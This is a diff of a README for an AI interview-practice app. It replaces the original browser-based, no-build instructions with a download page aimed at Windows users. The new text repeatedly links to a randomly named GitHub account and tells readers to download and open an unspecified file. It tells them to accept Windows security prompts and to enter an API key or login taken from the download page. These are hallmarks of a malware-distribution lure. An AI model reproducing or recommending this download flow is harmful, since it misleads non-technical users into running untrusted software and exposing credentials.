@@ -1,110 +1,210 @@
- 🎯 AI Interview Simulator
+# 🤖 AI-interview-simulator - Practice interviews with calm feedback
 
-A production-grade, fully interactive AI-powered interview simulator built with vanilla JavaScript  Practice technical, behavioral, and system design interviews with real-time AI feedback.
+[![Download AI-interview-simulator](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
 
+## 📥 Download
+Visit this page to download and run the app on Windows:
 
- ✨ Features
+[Download AI-interview-simulator](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
 
-- **Multiple Interview Types** — Technical, Behavioral, System Design, HR/Culture Fit
-- **Role-Specific Questions** — Software Engineer, Data Scientist, Product Manager, DevOps, Frontend, Backend, Full Stack
-- **Experience Levels** — Junior, Mid-level, Senior, Staff/Principal
-- **Real-time AI Interviewer** — Claude acts as a professional interviewer with follow-up questions
-- **Performance Scoring** — Get scored on clarity, depth, relevance, and communication
-- **Detailed Feedback** — Actionable post-interview analysis with strengths and improvement areas
-- **Session History** — Review past interview sessions
-- **Dark Professional UI** — Distraction-free, elegant interface
+## 🖥️ What this app does
 
+AI Interview Simulator lets you practice interviews with an AI interviewer powered by Claude. It is built for people who want to prepare for:
 
- 🚀 Quick Start
+- Technical interviews
+- Behavioral interviews
+- System design interviews
 
-# Option 1: Open Directly (No Build Needed)
+You can pick:
 
-```bash
-git clone https://github.com/yourusername/ai-interview-simulator.git
-cd ai-interview-simulator
-```
+- Your role
+- Your experience level
+- Your target company, such as Google, Meta, or Stripe
 
-Then open `index.html` in your browser. Enter your Anthropic API key when prompted.
+The app then runs a live interview with streamed responses. After the session, it gives you a scored review with clear feedback you can use right away.
 
-### Option 2: Serve Locally
+## ✅ What you need
 
-```bash
-# Using Node.js
-npx serve .
+Before you start, make sure you have:
 
-# Using Python
-python -m http.server 8080
+- A Windows computer
+- A modern web browser such as Chrome, Edge, or Firefox
+- An internet connection
+- Access to the download page above
 
-# Using PHP
-php -S localhost:8080
-```
+The app is designed to be simple to open and use. No extra setup is needed for most users.
 
-Visit `http://localhost:8080`
+## 🚀 Get started on Windows
 
----
+1. Open the download page above.
+2. Get the Windows version from the page.
+3. Save the file to your computer.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose to run the app.
+6. Wait for the app to open.
+7. Start your first interview.
 
-## 🔑 API Key Setup
+If the app opens in your browser, keep the tab open while you use it.
 
-1. Get your Anthropic API key from [console.anthropic.com](https://console.anthropic.com)
-2. Enter it in the app's settings panel
-3. Your key is stored only in `localStorage` — never sent anywhere except Anthropic's API
+## 🧭 First time setup
 
- **Note:** You need a valid Anthropic API key to use this app. Usage is billed according to Anthropic's pricing.
+When the app opens for the first time, you may see a few choices on screen.
 
----
+Choose:
 
+- The interview type
+- Your role
+- Your seniority level
+- The company you want to practice for
 
- 🎮 How to Use
+Then start the interview.
 
-1. **Configure** — Enter your API key and select your target role, experience level, and interview type
-2. **Start Interview** — The AI interviewer introduces itself and begins with an opening question
-3. **Respond** — Type your answers naturally; the AI will follow up with probing questions
-4. **Get Feedback** — After 5–10 questions, request a performance review with detailed scoring
-5. **Iterate** — Review feedback and start a new session to improve
+If there is a field for an API key or login, enter the details shown on the download page or in the app screen. Use the same browser or desktop session for the whole interview so your progress stays in place.
 
- 🛠️ Tech Stack
+## 🎯 How to use it
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | Vanilla JavaScript (ES6+) |
-| Styling | Pure CSS with custom properties |
-| AI Engine | Claude claude-sonnet-4-20250514 via Anthropic API |
-| Storage | Browser `localStorage` |
-| Build | None required (zero dependencies) |
+### 1. Pick your interview type
 
+Choose one of the main paths:
 
+- Technical
+- Behavioral
+- System design
 
- 📊 Scoring Rubric
+Pick the one that matches your goal. If you want full practice, run each one on separate sessions.
 
-Each response is evaluated on:
+### 2. Set your profile
 
-| Dimension | Weight | Description |
-|-----------|--------|-------------|
-| **Clarity** | 25% | How clearly and concisely the answer is communicated |
-| **Depth** | 30% | Technical accuracy and thoroughness of the response |
-| **Relevance** | 25% | How well the answer addresses the specific question |
-| **Communication** | 20% | Structure, examples used, confidence in delivery |
+Select:
 
+- Role, such as frontend, backend, full stack, data, or product
+- Level, such as junior, mid, or senior
+- Target company
 
+These choices help the AI ask better questions.
 
- 🤝 Contributing
+### 3. Answer the questions
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+Type your answer in the chat or response box. The AI interviewer may ask follow-up questions based on what you say.
 
- 📋 Roadmap
+For best results:
 
-- [ ] Voice input/output (Web Speech API)
-- [ ] Export interview transcript as PDF
-- [ ] Multi-language support
-- [ ] Company-specific interview prep modes (Google, Meta, Amazon, etc.)
-- [ ] Peer comparison analytics
-- [ ] Integration with job listings (auto-generate role-specific prep)
+- Keep answers clear
+- Give direct examples
+- Explain your thinking
+- Use real project stories when you can
 
- 📄 License
+### 4. Review your score
 
-MIT License — see [LICENSE](LICENSE) for details.
-*Made for engineers who take their interviews seriously.*
+After the interview, you get a score and feedback. Use it to spot weak areas such as:
+
+- Missing structure
+- Weak examples
+- Poor tradeoffs
+- Unclear system design thinking
+- Gaps in core knowledge
+
+## 🧠 Features
+
+- AI interviewer powered by Claude
+- Live streamed responses
+- Support for technical, behavioral, and system design practice
+- Role and level selection
+- Target company presets
+- Scored performance review
+- Actionable feedback after each session
+- Simple start flow for non-technical users
+- No extra software steps for most setups
+
+## 🗂️ Typical interview flow
+
+1. Open the app
+2. Choose the interview type
+3. Choose your role
+4. Choose your level
+5. Choose a target company
+6. Start the session
+7. Answer each question
+8. Read the score and feedback
+9. Run another session and improve
+
+## 💬 Best ways to prepare
+
+To get more value from each session:
+
+- Practice out loud before you type
+- Use the STAR method for behavioral answers
+- Name tradeoffs in system design answers
+- Explain your choices in simple steps
+- Keep your answers short at first, then expand if asked
+- Repeat sessions with the same role to track progress
+
+## 🔧 Common use cases
+
+### Technical interviews
+Practice coding and problem solving, explain algorithms, and answer core engineering questions.
+
+### Behavioral interviews
+Practice answers about teamwork, conflict, failure, leadership, and impact.
+
+### System design interviews
+Practice planning large systems, discussing scaling, data flow, storage, and reliability.
+
+## 📋 Example session
+
+A simple session may look like this:
+
+- Role: Backend Engineer
+- Level: Mid
+- Company: Stripe
+- Type: System Design
+
+The AI may ask you to design a payment flow, explain data storage, or talk about failure handling. You answer in plain language, and the app scores your response at the end.
+
+## 🛠️ If the app will not open
+
+Try these steps:
+
+1. Close the app.
+2. Open it again.
+3. Check your internet connection.
+4. Make sure your browser is up to date.
+5. Download the file again from the link above.
+6. Try a different browser if the page does not load.
+
+If Windows shows a security prompt, choose the option that lets you run the app if you trust the source page you used to get it.
+
+## ❓ Questions you may ask
+
+### Can I use it without coding knowledge?
+Yes. The app is made for normal users who want interview practice.
+
+### Does it work for different roles?
+Yes. You can pick a role before each session.
+
+### Can I use it more than once?
+Yes. You can run as many practice sessions as you want.
+
+### Does it give feedback after the interview?
+Yes. It gives a scored review with feedback you can act on.
+
+### Can I practice for top tech companies?
+Yes. You can choose targets like Google, Meta, and Stripe.
+
+## 📌 Suggested practice plan
+
+Try this simple plan:
+
+- Day 1: Behavioral interview
+- Day 2: Technical interview
+- Day 3: System design interview
+- Day 4: Repeat your weakest area
+- Day 5: Run a full mock session
+
+Use the feedback from each run to improve the next one
+
+## 🔗 Download again
+
+If you need the app later, use this page:
+
+[https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
